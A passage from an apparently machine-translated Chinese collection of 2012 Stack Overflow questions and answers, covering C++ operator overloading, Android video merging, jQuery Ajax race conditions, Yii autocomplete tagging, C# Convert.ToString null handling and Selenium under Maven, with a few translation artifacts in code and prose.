    // Manually start a dispatch, not needed if the tracker was started with a dispatch
    // interval.
    tracker.dispatch();
  }
}); 
```

}

受保护的无效 onDestroy() { super.onDestroy(); // 不再需要时停止跟踪器。tracker.stopSession(); }

在查看 logcat 时，我看到它传输正常。

你认为是什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:56:10.880

3天后，我找到了解决方案。

当我使用来自谷歌的标准 SDK 示例时，使用的是谷歌分析库版本 1（libGoogleAnalytics.jar），但是当我从谷歌分析网站引用时，他们说我们应该使用协议的版本 2（libGoogleAnalyticsV2.jar）。所以我猜sdk中的例子还没有更新......

无论如何，不​​是它工作得很好。

# c++ - 如何重载乘法运算符？

> ID：13514316
> 
> 赞同：0
> 
> 时间：2012-11-22T13:59:43.213
> 
> 标签：c++, operator-overloading, matrix-multiplication

我有一个矩阵类。我正在重载乘法运算符，但只有当我调用 Matrix *scalar 时它才有效；不适用于标量*矩阵。我怎样才能解决这个问题？

```
#include <iostream>
#include <stdint.h>

template<class T>
class Matrix {
public:
    Matrix(unsigned rows, unsigned cols);
    Matrix(const Matrix<T>& m);
    Matrix();
    ~Matrix(); // Destructor

Matrix<T> operator *(T k) const;

    unsigned rows, cols;
private:
    int index;
    T* data_;
};

template<class T>
Matrix<T> Matrix<T>::operator *(T k) const { 
    Matrix<double> tmp(rows, cols);
    for (unsigned i = 0; i < rows * cols; i++)
        tmp.data_[i] = data_[i] * k;

    return tmp;
}

template<class T>
Matrix<T> operator *(T k, const Matrix<T>& B) {
    return B * k;
} 
```

**已编辑**

* * *

我实现了[chill](https://stackoverflow.com/users/390807/chill) [建议](https://stackoverflow.com/a/13514436/15168)的内容，但出现以下错误：

```
main.cpp: In function ‘int main(int, char**)’:
main.cpp:44:19: error: no match for ‘operator*’ in ‘12 * u2’
main.cpp:44:19: note: candidate is:
lcomatrix/lcomatrix.hpp:149:11: note: template<class T> Matrix<T> operator*(T, const Matrix<T>&)
make: *** [main.o] Error 1 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:03:17.577

不要让运营商成为会员。将 an 定义`operator*=`为 Matrix 的成员，然后定义两个 free `operator*`，`*=`在其实现中使用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-22T14:07:18.553

在类外部定义一个`operator*`，它只是反转参数。并将另一个声明`operator*`为`const`.

```
template<typename T> Matrix<T> operator* (T k, const Matrix<T> &m) { return m * k; } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:07:07.930

类成员`operator *`对其对应的对象（左侧）进行操作，调用`M * scalar`对应于`A.operator*(scalar)`- 如果您切换顺序，这显然不适用，因为您没有为标量定义 operator *。您可以创建一个全局`operator *`实现，它接受标量作为第一个（左）操作数，接受矩阵作为第二个操作数。在实现内部切换顺序并调用您的 inclass 类`operator *`。例如：

```
template <class T>
Matrix<T> operator *(T scalar, const Matrix<T> &M)
{
    return M * scalar;
} 
```

# java - 如何在 Android 中连接或合并两个或多个视频文件？

> ID：13514317
> 
> 赞同：12
> 
> 时间：2012-11-22T13:59:47.140
> 
> 标签：java, android, video

我想合并两个或多个视频文件（它们可能是两个 mp4 或两个 3gp，或任何其他格式）。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-22T15:13:44.683

您可以使用的最通用的工具是 ffmpeg（如上面@Jeremy 所述），但在手机上使用它需要一些工作；它也是 LGPL 许可的，它的一些编码器（特别是 x264）是 GPL。

一个更简单的解决方案，如果您要连接的两个文件都使用相似的编码，并且包含在从 MP4 派生的文件格式中（3GP 就是这样），则使用纯 java MP4 解析器并连接视频而不接触媒体流本身. 看看[mp4parser](https://code.google.com/p/mp4parser/)，这是一个纯 java 的开源解析器，在 Apache 许可下获得许可，甚至在其 wiki 中有一个[连接视频的示例。](https://code.google.com/p/mp4parser/wiki/AppendTracks)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2015-01-20T15:50:03.843

你可以试试INDE Media for Mobile，教程在这里：[https ://software.intel.com/en-us/articles/intel-inde-media-pack-for-android-tutorials](https://software.intel.com/en-us/articles/intel-inde-media-pack-for-android-tutorials)

它在 MediaComposer 类中具有转码\remuxing 功能，并且可以加入文件\文件段。由于它使用 MediaCodec API，内部编码是在 GPU 上完成的，因此非常电池友好并且工作速度尽可能快。

显示如何启用加入或其他功能的示例代码在 github 上：[https ://github.com/INDExOS/media-for-mobile](https://github.com/INDExOS/media-for-mobile)

![在此处输入图像描述](../Images/8e2b82ddfb5f2b532c7967e87fe5367e.png) ![在此处输入图像描述](../Images/f1ad83ddef20e0305de42a589b95ecec.png) ![在此处输入图像描述](../Images/59a4b8f3c608da3ed75de8fc5f5d772a.png)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2020-02-25T15:43:09.413

**我将分享 Java 和 Kotlin 代码**

它在内部使用 FFmpeg，但它是轻量级的。添加两个不同类型或编解码器、帧率和比特率的视频的最简单方法是使用 EpMedia 库。

**等级依赖性**

```
implementation 'com.github.yangjie10930:EpMedia:v0.9.5' 
```

**Kotlin 代码**

```
 val epVideos = ArrayList<EpVideo>()
    epVideos.add(EpVideo("/storage/emulated/0/Contact/1.mp4")) // Video 1 Example
    epVideos.add(EpVideo("/storage/emulated/0/Contact/2.mp4")) // Video 2 Exmaple
    val outputOption = EpEditor.OutputOption ("/storage/emulated/0/merge.mp4"); //Output
    outputOption.setWidth(720) // output video width, default 480
    outputOption.setHeight(1280)
    outputOption.frameRate =  25 ; // output video frame rate, default 30

    EpEditor.merge(epVideos,outputOption,object:OnEditorListener{
        override fun onSuccess() {

        }

        override fun onFailure() {

        }

        override fun onProgress(progress: Float) {
            Log.d("Progress","$progress")
        }

    }) 
```

**Java 代码**

```
 private void mergeVideos() {
    ArrayList<EpVideo> epVideos =  new  ArrayList<>();
    epVideos.add(new EpVideo (file2)); // Video 1
    epVideos.add(new EpVideo (file1)); // Video 2
    EpEditor. OutputOption outputOption =new EpEditor.OutputOption(fileOutput);
    outputOption.setWidth(720);
    outputOption.setHeight(1280);
    outputOption.frameRate = 25 ;
    outputOption.bitRate = 10 ;
    EpEditor.merge(epVideos, outputOption, new  OnEditorListener() {
        @Override
        public  void  onSuccess () {
            Log.d("Status","Success");

        }

        @Override
        public  void  onFailure () {

        }

        @Override
        public  void  onProgress ( float  progress ) {
            // Get processing progress here
            Log.d("Progress",""+progress);
        }
    });

} 
```

# php - Ajax 调用太慢？Javascript 和 PHP

> ID：13514322
> 
> 赞同：0
> 
> 时间：2012-11-22T13:59:59.480
> 
> 标签：php, javascript, ajax, forms, request

我正在设置一个注册表单。此表单有 7 个正在测试验证的字段。其中2个具有特殊验证；我有一个对 PHP 类的 Ajax 调用，我将 email_string 发送到这个类，测试我的数据库中是否已经存在这样的电子邮件（避免重复）。

```
params = {};
params['source'] = 'checkEMail';
params['email']  = email
$.ajax({
    type: 'POST',
    url : 'some_class.php',
    data : params,
    success: function(msg)
    {
        if(msg > 0) /* email exists */
            is_error = true;
    }
}); 
```

在我的 PHP 类中，我得到了这样的东西：

```
$final = mysql_fetch_assoc(foo);
echo ($final) ? 1 : 0; 
```

我正在测试数据，事实上 - 如果电子邮件存在，我会得到“1”，如果不存在，我会得到“0”。

有趣的是，只要此表单中存在其他错误，此代码段就可以正常工作**-**例如**空**用户名。“is_error”是一个布尔值，在脚本开始时设置为 false，如果一次验证失败，则为 true。然后，最后，我得到了这个：

```
if(is_error)
{
    error.show();
    error.empty().append('some html foo');
}
else
{
    $('form').submit();
    error.empty().hide();
} 
```

那么，尽管 is_error 设置为 true，但我怎么会发送表单呢？我能想到的唯一原因是表单在“is_error”被测试之前发送 - 但表单的发送位于脚本的最底部。

哦，我这样称呼它：

```
<script type="text/javascript">
            $("#reg_submit").click(function(event) {
                event.preventDefault(); 
                checkReg();
            });
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:13:05.603

也许它是由您尝试匹配的不同输出类型引起的......

首先，将您的 PHP 输出更改为

```
echo json_encode($final ? true : false); 
```

然后，要使用 JSON，我会将此行添加到 ajax 调用方法中，以确保...

```
$.ajax({
    type: 'POST',
    dataType:'json',
    ...
    success: function(msg)
    {
        if(msg!==true){
            is_error = true;
        }
    }
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:14:46.210

`if(is_error){`我建议您在 ajax 请求完成中执行它以避免竞争条件，而不是将部分放在脚本末尾：

```
$.ajax({
    type: 'POST',
    url: 'some_class.php',
    data: params,
    success: function(msg) {
        if (msg > 0) /* email exists */
        is_error = true;
    },
    complete: function() {
        if (is_error) {
            error.show();
            error.empty().append('some html foo');
        } else {
            $('form').submit();
            error.empty().hide();
        }
    }
 }); 
```

# ios - 获取后如何禁止iad刷新广告

> ID：13514323
> 
> 赞同：2
> 
> 时间：2012-11-22T13:59:59.890
> 
> 标签：ios, iad

我只需要为一个屏幕获取一次广告。

如何禁用广告刷新。

我尝试设置'setRefreshInterval'，但由于它是一个无法识别的选择器而崩溃，有趣的原因是 xcode 建议它。

那么如何在获取后禁用广告刷新？

```
self.iAdAdView = [[ADBannerView alloc] initWithFrame:CGRectMake(0, lxPosition, MAIN_VIEW_WIDTH, AD_VIEW_HEIGHT)];

if (&ADBannerContentSizeIdentifierPortrait != nil) {
    [_iAdAdView setCurrentContentSizeIdentifier:ADBannerContentSizeIdentifierPortrait];
} else {
    [_iAdAdView setCurrentContentSizeIdentifier:ADBannerContentSizeIdentifier320x50];
}
[_iAdAdView setDelegate:self];
[_iAdAdView setRefreshInterval:0]; 
```

# android - Google Play，应用程序与三星平板电脑不兼容

> ID：13514325
> 
> 赞同：2
> 
> 时间：2012-11-22T14:00:04.677
> 
> 标签：android, google-play

在 GooglePlay 上发布我们的应用程序并将其安装在多台设备上后，一切似乎都可以正常工作，但某些平板电脑在商店中显示为“不兼容”。

该平板电脑是 Galaxy Tab 2 (10.1)

这是我们的包 $ aapt dump badging 的一些结果：

```
sdkVersion:'7'
targetSdkVersion:'17'
supports-screens: 'small' 'normal' 'large' 'xlarge'
supports-any-density: 'true'
locales: '--_--'
densities: '120' '160' '240' '320' 
```

我们的平板电脑有 4.0.4，在检查了安装了该版本的下载统计设备后，还通过电子邮件发送了包进行安装，并且在该设备上运行正常，没有任何问题。

任何提示将不胜感激，谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T22:27:51.550

试试这三件事：

1 - 禁用“触摸屏”。

```
<uses-feature android:name="android.hardware.touchscreen"  android:required="false" /> 
```

这会禁用 ADVANCE 触摸屏控制（如轻弹等）

2 - 如果您使用它，请在 Play 商店发布页面中禁用复制保护。

3 - 同样在您的清单文件中，您可以尝试以下操作：

```
<compatible-screens>
    <screen android:screenSize="small" android:screenDensity="ldpi" />
    <screen android:screenSize="small" android:screenDensity="mdpi" />
    <screen android:screenSize="small" android:screenDensity="hdpi" />
    <screen android:screenSize="small" android:screenDensity="xhdpi" />
    <screen android:screenSize="normal" android:screenDensity="ldpi" />
    <screen android:screenSize="normal" android:screenDensity="mdpi" />
    <screen android:screenSize="normal" android:screenDensity="hdpi" />
    <screen android:screenSize="normal" android:screenDensity="xhdpi" />
</compatible-screens> 
```

# kohana - Kohana ORM 级联删除

> ID：13514326
> 
> 赞同：2
> 
> 时间：2012-11-22T14:00:08.240
> 
> 标签：kohana, kohana-orm, kohana-3.2

Kohana 3.2 ORM 中是否有任何用于级联删除的方法。我是 kohana 的初学者，所以任何人都可以在这件事上帮助我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T13:34:23.043

恐怕Kohana没有。如果你真的需要一个，你应该在数据库级别应用它（[ON DELETE CASCADE](https://www.google.pl/search?q=on%20delete%20cascade&ie=utf-8&oe=utf-8&aq=t)）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-15T05:16:46.543

要级联删除，请覆盖`delete()`模型中的方法：

```
class Model_Alpha extends ORM
{
  protected $_has_many = array(
    'beta' => array(
      'model' => 'beta',
      'foreign_key' => 'alpha_id',
    ),
    'gamma' => array(
      'model' => 'gamma',
      'foreign_key' => 'alpha_id',
    ),
  );

  function delete()
  {
    foreach($this->beta->find_all() as $entry)
      $entry->delete();
    foreach($this->gamma->find_all() as $entry)
      $entry->delete();
    parent::delete();
  }
} 
```

`delete()`然后，您可以通过覆盖要删除的模型上的方法来进一步级联。

# ios - 通用项目中的动画和帧，边界处理问题

> ID：13514332
> 
> 赞同：0
> 
> 时间：2012-11-22T14:00:31.213
> 
> 标签：ios, core-animation, ios-universal-app

对我目前正在开发的通用应用程序的一个担忧。我刚刚完成功能开发，需要添加眼睛糖果（动画）。现在想知道在单个 iPhone 或 iPad 应用程序中，我只需播放并设置框架、边界，以使用硬编码值移动视图、图层等。

现在您将如何处理不同的设备框架和边界？这意味着您想要将 UIImageView 从父视图边界之外移动并使其到达某个位置。在测试我们在什么设备上运行时进行不同的处理？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:34:19.167

你可以在你的`AppDelegate`,

```
- (BOOL) ISIPAD {
    return (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad);
} 
```

每次制作动画时都要参考。如果您的类中有一些具有屏幕宽度的变量等，您只需要在`viewDidLoad`, 或您的`init`方法中检查这一点。然后你可以使用动态变量来做你的动画。要将按钮放置在屏幕中间，您可以执行以下操作：

```
[UIView animateWithDuration:1.0 animations:^{
    UIButton *yourButton;
    yourButton.frame = (CGRect){.origin = CGPointMake(screenwidth/2.0f-yourButton.frame.size.width/2.0f, screenheight/2.0f - yourButton.frame.size.height/2.0f), .size = yourButton.frame.size};
}]; 
```

考虑到屏幕变量是在您的`init`or`viewDidLoad`方法中设置的，这会将您的按钮放在屏幕中间。

# autocomplete - Yii CJuiAutoComplete 用于多个值

> ID：13514335
> 
> 赞同：2
> 
> 时间：2012-11-22T14:00:40.883
> 
> 标签：autocomplete, yii, yii-extensions

我是 Yii 初学者，目前正在开发一个标签系统，其中有 3 个表：

*   问题（id、content、create_d、...等）

*   标签（id，标签）

*   issue_tag_map (id,tag_id_fk,issue_id_fk)

在我的`/Views/Issue/_form`中，我添加了一个[MultiComplete](http://www.yiiframework.com/extension/multicomplete/) Extension 来检索多个标签 ID 和标签，

我使用了一个`afterSave`函数来直接将`Issue_id`和 autocompleted存储`Tag_id`在`Issue_tag_map`表中，它是一个`HAS_MANY`关系。

不幸的是，没有任何东西被退回。

我想知道是否有办法将自动完成的 Tag_ids 存储在临时属性中，然后将其传递给模型的`afterSave(`) 函数。

我一直在寻找一段时间，这一直让我发疯，因为我觉得我错过了一个非常简单的步骤！

任何帮助或任何形式的建议都非常感谢！

*多完成`Views/Issue/_form`*：

```
 <?php

     echo $form->labelEx($model, 'Tag');
     $this->widget('application.extension.MultiComplete', array(
    'model' => $model,
    'attribute' => '', //Was thinking of creating a temporary here
    'name' => 'tag_autocomplete',
    'splitter' => ',',
    'sourceUrl' => $this->createUrl('Issue/tagAutoComplete'),
    // Controller/Action path for action we created in step 4.
    // additional javascript options for the autocomplete plugin
    'options' => array(
        'minLength' => '2',
    ),
    'htmlOptions' => array(
        'style' => 'height:20px;',
    ),
));
echo $form->error($model, 'issue_comment_id_fk');
?> 
```

*保存后`/model/Issue`*：

```
 protected function afterSave() {
    parent::afterSave();

    $issue_id = Yii::app()->db->getLastInsertID();

    $tag; //here I would explode the attribute retrieved by the view form
    // an SQL with two placeholders ":issue_id" and ":tag_id"
    if (is_array($tag))
        foreach ($tag as $tag_id) {
            $sql = "INSERT INTO issue_tag_map (issue_id_fk, tag_id_fk)VALUES(:issue_id,:tag_id)";     

            $command = Yii::app()->db->createCommand($sql);
           // replace the placeholder ":issue_id" with the actual issue value

            $command->bindValue(":issue_id", $issue_id, PDO::PARAM_STR);
           // replace the placeholder ":tag_id" with the actual tag_id value

            $command->bindValue(":tag_id", $tag_id, PDO::PARAM_STR);
            $command->execute();
        }
} 
```

这是问题模型中用于填充标签的自动完成 sourceUrl：

```
 public static function tagAutoComplete($name = '') {

    $sql = 'SELECT id ,tag AS label FROM tag WHERE tag LIKE :tag';
    $name = $name . '%';
    return Yii::app()->db->createCommand($sql)->queryAll(true, array(':tag' => $name)); 
```

/controllers/IssueController 中的 actionTagAutoComplete：

```
// This function will echo a JSON object 
// of this format:
// [{id:id, name: 'name'}]
function actionTagAutocomplete() {

    $term = trim($_GET['term']);
    if ($term != '') {
        $tags = issue::tagAutoComplete($term);
        echo CJSON::encode($tags);
        Yii::app()->end();
    }
} 
```

**编辑**

窗体中的小部件：

```
 <div class="row" id="checks" >
    <?php
    echo $form->labelEx($model, 'company',array('title'=>'File Company Distrubution; Companies can be edited by Admins'));

    ?>
   <?php
    $this->widget('application.extension.MultiComplete', array(
        'model' => $model,
        'attribute' => 'company',
        'splitter' => ',',
        'name' => 'company_autocomplete',
        'sourceUrl' => $this->createUrl('becomEn/CompanyAutocomplete'),
        'options' => array(
            'minLength' => '1',
        ),
        'htmlOptions' => array(
            'style' => 'height:20px;',
            'size' => '45',
        ),
    ));
    echo $form->error($model, 'company');
    ?>
</div> 
```

更新功能：

```
 $model = $this->loadModel($id);
    .....
      if (isset($_POST['News'])) {
         $model->attributes = $_POST['News'];
        $model->companies = $this->getRecordsFromAutocompleteString($_POST['News']  
       ['company']);
    ......
     ......
      getRecordsFromAutocompleteString():
  public static cordsFromAutocompleteString($string) {
    $string = trim($string);
    $stringArray = explode(", ", $string);
    $stringArray[count($stringArray) - 1] = str_replace(",", "", $stringArray[count($stringArray) - 1]);
    $criteria = new CDbCriteria();
    $criteria->select = 'id';
    $criteria->condition = 'company =:company';
    $companies = array();
    foreach ($stringArray as $company) {
        $criteria->params = array(':company' => $company);
        $companies[] = Company::model()->find($criteria);
    }
    return $companies;
} 
```

**更新** ，因为“值”属性在此扩展中未正确实现，我提到将此功能扩展到模型：

```
 public function afterFind() {
       //tag is the attribute used in form
      $this->tag = $this->getAllTagNames();
      parent::afterFind();
   } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T09:48:21.440

您应该在模型`Issue`和`Tag`模型中定义的问题和标签之间存在关系（应该是 many_many 关系）。

因此，`IssueController`当您将数据发送到模型`create`或`update`问题时，您将获得相关的标签（在我的情况下，我得到一个字符串，如“错误，问题，...”）。然后你需要在你的控制器中解析这个字符串，获取相应的模型并将它们分配给相关的标签。

这是一个通用示例：

```
//In the controller's method where you add/update the record
$issue->tags = getRecordsFromAutocompleteString($_POST['autocompleteAttribute'], 'Tag', 'tag'); 
```

这里我调用的方法：

```
//parse your string ang fetch the related models
public static function getRecordsFromAutocompleteString($string, $model, $field)
        {
            $string = trim($string);
            $stringArray = explode(", ", $string);
            $stringArray[count($stringArray) - 1] = str_replace(",", "", $stringArray[count($stringArray) - 1]);
            return CActiveRecord::model($model)->findAllByAttributes(array($field => $stringArray));
        } 
```

所以现在你的 $issue->tags 是一个包含所有相关标签对象的数组。

在您的`afterSave`方法中，您将能够：

```
protected function afterSave() {
    parent::afterSave();

    //$issue_id = Yii::app()->db->getLastInsertID(); Don't need it, yii is already doing it
    foreach ($this->tags as $tag) {
        $sql = "INSERT INTO issue_tag_map (issue_id_fk, tag_id_fk)VALUES(:issue_id,:tag_id)";     
        $command = Yii::app()->db->createCommand($sql);
        $command->bindValue(":issue_id", $this->id, PDO::PARAM_INT);
        $command->bindValue(":tag_id", $tag->id, PDO::PARAM_INT);
        $command->execute();
        }
} 
```

现在上面的代码是一个基本的解决方案。我鼓励您使用[activerecord-relation-behavior 的扩展](http://www.yiiframework.com/extension/activerecord-relation-behavior/)来保存相关模型。使用此扩展，您无需在`afterSave`方法中定义任何内容，您只需要做：

```
$issue->tags = getRecordsFromAutocompleteString($_POST['autocompleteAttribute'], 'Tag', 'tag');
$issue->save(); // all the related models are saved by the extension, no afterSave defined! 
```

然后，您可以通过在自动完成中获取 id 以及标签来优化脚本，并将选定的 id 存储在 Json 数组中。这样您就不必执行 sql 查询`getRecordsFromAutocompleteString`来获取 id。使用上面提到的扩展，您将能够：

```
$issue->tags = CJSON::Decode($_POST['idTags']);//will obtain array(1, 13, ...)
$issue->save(); // all the related models are saved by the extension, the extension is handling both models and array for the relation! 
```

**编辑：**

如果要填写自动完成字段，可以定义以下函数：

```
public static function appendModelstoString($models, $fieldName)
    {
        $list = array();
        foreach($models as $model)
        {
            $list[] = $model->$fieldName;
        }
        return implode(', ', $list);
    } 
```

您提供字段的名称（在您的情况下`tag`）和相关模型的列表，它将生成适当的字符串。然后将字符串传递给视图并将其作为自动完成字段的默认值。

**回答您的编辑：**

在您的控制器中，您说此模型的公司是您从自动完成表单中添加的公司：

```
$model->companies = $this->getRecordsFromAutocompleteString($_POST['News']  
   ['company']); 
```

因此，如果关联公司不在表单中，则不会将其保存为关联模型。您有 2 个解决方案：

1.  每次在显示之前将已经存在的相关模型放入表单中的自动完成字段中，这样它们就会再次保存为相关模型，并且不会从相关模型中消失

    ```
    $this->widget('application.extensions.multicomplete.MultiComplete', array(
                    'name' => 'people',
                    'value' => (isset($people))?$people:'',
                    'sourceUrl' => array('searchAutocompletePeople'),
    )); 
    ```

2.  在您的控制器中，在调用之前`getRecordsFromAutocompleteString`添加模型的现有模型。

    ```
    $model->companies = array_merge(
        $model->companies, 
        $this->getRecordsFromAutocompleteString($_POST['News']['company'])
    ); 
    ```

# c# - C#.net WSDL 中的 Web 服务请求问题

> ID：13514336
> 
> 赞同：0
> 
> 时间：2012-11-22T14:00:42.100
> 
> 标签：c#

我们正在为 C#.net 中的 IBM Maximo Web 服务创建一个 Web 服务请求，除了少数 Web 服务请求之外，我们对所有其他 Web 服务都获得了成功的响应，但是对于某些请求根本没有响应，但是当我们使用 SOAP UI 发出相同的请求，我们得到响应。

问题出在哪里？有任何想法吗？。

非常感谢，byfour

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:13:39.277

> 有任何想法吗？

开始调试。首先，您的应用程序当然包含日志记录，因此您可以查看发送消息时是否发生任何异常。

如果您没有出现异常，您可以[配置跟踪](http://msdn.microsoft.com/en-us/library/ms733025.aspx)以记录 WCF 管道正在执行的所有操作，以便您查看该部分是否正常。如果是这样，您可以开始调试网络。如果你看到你的信息通过网络传输，是时候拿起电话给对方打电话，询问他们在收到你的信息后是否看到任何事情发生。

# c# - Convert.ToString 对于“NULL 对象”和“NULL 字符串”的行为不同

> ID：13514337
> 
> 赞同：11
> 
> 时间：2012-11-22T14:00:43.933
> 
> 标签：c#

我在 C# 控制台应用程序中有 foo ( `object`) 和 foo2 ( )。`string`代码 2 抛出异常，而代码 1 工作正常。

您能否解释一下为什么会这样（参考 MSDN）？

// 代码 1

```
object foo = null;
string test = Convert.ToString(foo).Substring(0, Convert.ToString(foo).Length >= 5 ? 5 : Convert.ToString(foo).Length); 
```

// 代码 2

```
string foo2 = null;
string test2 = Convert.ToString(foo2).Substring(0, Convert.ToString(foo2).Length >= 5 ? 5 : Convert.ToString(foo2).Length); 
```

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-11-22T14:05:42.740

从以下文档[`Convert.ToString(string)`](http://msdn.microsoft.com/en-us/library/1a2xyyx8.aspx)：

> **返回值**
> 类型：`System.String`
> *值*原样返回。

所以`null`输入会产生一个`null`返回值。

从以下文档[`Convert.ToString(object)`](http://msdn.microsoft.com/en-us/library/astxcyeh.aspx)：

> **返回值**
> 类型：*value*`System.String`
> 的字符串表示形式，或者如果*value*为 null。*`String.Empty`*

 **（这里“Nothing”的意思是“null”。）

所以`null`输入将导致一个空字符串（非空引用）返回值。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-22T14:09:33.560

因为：

这是 Convert.ToString(object value) 的实现

```
public static string ToString(Object value) {
    return ToString(value,null);
}

public static string ToString(Object value, IFormatProvider provider) { 
    IConvertible ic = value as IConvertible; 
    if (ic != null)
        return ic.ToString(provider); 
    IFormattable formattable = value as IFormattable;
    if (formattable != null)
        return formattable.ToString(null, provider);
    return value == null? String.Empty: value.ToString(); 
} 
```

这是 Convert.ToString(string value)

```
public static String ToString(String value) {
        Contract.Ensures(Contract.Result<string>() == value);  // We were always skipping the null check here.
        return value; 
    } 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-22T14:07:18.250

从这个[链接](https://stackoverflow.com/questions/10355736/why-does-convert-tostringnull-return-a-different-value-if-you-cast-null)：

有 2 个 ToString 重载在这里起作用

```
Convert.ToString(object o);
Convert.ToString(string s); 
```

C# 编译器本质上试图选择最具体的重载，它将与输入一起工作。空值可转换为任何引用类型。在这种情况下，字符串比对象更具体，因此它将被选为获胜者。

在 null as object 中，您已将表达式的类型固化为对象。这意味着它不再与字符串重载兼容，编译器会选择对象重载，因为它是唯一兼容的。

C# 语言规范的第 7.4.3 节介绍了这种打破平局如何工作的真正令人毛骨悚然的细节。**

# java - 无法在 Maven 中使用 Selenium 连接到二进制 FirefoxBinary

> ID：13514338
> 
> 赞同：33
> 
> 时间：2012-11-22T14:00:45.543
> 
> 标签：java, maven, selenium, junit, selenium-webdriver

我正在运行一些硒测试。当我直接从 Eclipse 启动它们时，一切正常。但是当我通过 Maven 启动它们时，会发生以下异常：

```
org.openqa.selenium.WebDriverException(Failed to connect to binary FirefoxBinary(C:\winapp\Firefox\firefox.exe) on port 7055; process output follows: 
null
Build info: version: '2.26.0', revision: '18040', time: '2012-11-02 09:44:45'
System info: os.name: 'Windows 7', os.arch: 'x86', os.version: '6.1', java.version: '1.6.0_35'
Driver info: driver.version: FirefoxDriver) 
```

我正在使用 Firefox 10.0.10 ESR。我也尝试过使用 Selenium 2.25.0。

这是我最新版本的 pom.xml：

```
<dependencies>
    <dependency>
        <groupId>junit</groupId>
        <artifactId>junit</artifactId>
        <version>4.10</version>
    </dependency>
    <dependency>
        <groupId>org.seleniumhq.selenium</groupId>
        <artifactId>selenium-java</artifactId>
        <version>2.26.0</version>
    </dependency>
    <dependency>
        <groupId>org.seleniumhq.selenium</groupId>
        <artifactId>selenium-server</artifactId>
        <version>2.26.0</version>
        <exclusions>
            <exclusion>
                <groupId>javax.servlet</groupId>
                <artifactId>servlet-api</artifactId>
            </exclusion>
        </exclusions>
    </dependency>
    <dependency>
        <groupId>com.thoughtworks.xstream</groupId>
        <artifactId>xstream</artifactId>
        <version>1.4.1</version>
        <type>jar</type>
    </dependency>
    <dependency>
        <groupId>org.jdom</groupId>
        <artifactId>jdom2</artifactId>
        <version>2.0.3</version>
    </dependency>
</dependencies> 
```

如果我可以为您提供更多信息，请告诉我。

编辑：更新 pom.xml

edit2：最让我惊奇的是，我可以从 Eclipse 运行测试而不会出现问题。它们只是发生了，例如，如果我调用“mvn install”

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-12-03T05:33:11.793

当我遇到这个错误时，它通常是两件事之一。

**Selenium 版本不支持浏览器版本** 仔细检查从 Eclipse 与 Maven 运行时 Selenium/浏览器版本是否相同。仔细检查 Eclipse 和 Maven 配置为使用相同的 Selenium 版本。当我的浏览器自动更新时，这发生在我身上，所以我在浏览器中关闭了它。

**Selenium 测试以无头模式运行，** 如果您在与 Eclipse 相同的机器上手动执行 mvn，则不太可能。在我的 Jenkins 服务器上通过 Maven 运行 Selenium 时，这发生在我身上。Jenkins 服务器以无头模式运行。花了我一分钟来弄清楚无头的东西，我想我在 Linux 中设置了一个 DISPLAY 环境变量或其他东西。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-03T11:22:44.070

我弄清楚问题出在哪里。

我加载了一些扩展来添加到我用来实例化 FireFoxDriver 的 FirefoxProfile。这些插件位于 Java/main/resources 下。在 Eclipse 中一切正常，但我无法通过 Maven 访问这些插件。将这些文件复制到临时文件夹并从那里加载它们后，它甚至可以从 Maven 工作。

感谢您的帮助

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-22T14:57:00.730

尝试将此添加到您的 pom

**更新：**

```
<dependency>
    <groupId>org.seleniumhq.webdriver</groupId>
    <artifactId>selenium-firefox-driver</artifactId>
    <version>2.XX.X</version>
</dependency>

<dependency>
    <groupId>org.seleniumhq.selenium</groupId>
    <artifactId>selenium-server</artifactId>
    <version>2.XX.X</version>
</dependency> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-09-24T14:21:31.367

Linux 更新后出现了类似的问题。我们测试了许多 selenium 版本（2.42.2 和 2.43.1）和 firefox（27.0.1 到 32.0.2）的组合，但问题始终存在。

我们在 OpenMandriva 下，项目在 Eclipse 和 Maven 下。

我们为我们找到了一个解决方案，即替换以下 maven 依赖项

```
 <dependency>
        <groupId>org.seleniumhq.selenium</groupId>
        <artifactId>selenium-java</artifactId>
        <version>2.43.1</version>
    </dependency> 
```

由以下所有：

```
 <dependency>
        <groupId>org.seleniumhq.selenium</groupId>
        <artifactId>selenium-firefox-driver</artifactId>
        <version>2.43.1</version>
    </dependency>

    <dependency>
        <groupId>org.seleniumhq.selenium</groupId>
        <artifactId>selenium-support</artifactId>
        <version>2.43.1</version>
    </dependency>   

    <dependency>
        <groupId>org.seleniumhq.selenium</groupId>
        <artifactId>selenium-api</artifactId>
        <version>2.43.1</version>
    </dependency>

    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-lang3</artifactId>
        <version>3.0</version>
    </dependency>

    <dependency>
        <groupId>org.apache.httpcomponents</groupId>
        <artifactId>httpclient</artifactId>
        <version>4.3.5</version>
    </dependency> 
```

我想知道这个解决方案是否只是隐藏了真正的问题？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-12-17T13:57:57.207

如果您已将 Firefox 和 Selenium 都更新到最新版本以尝试解决此问题，但您仍然面临该问题，则您可能已使用“重新启动以更新”来更新 Firefox。

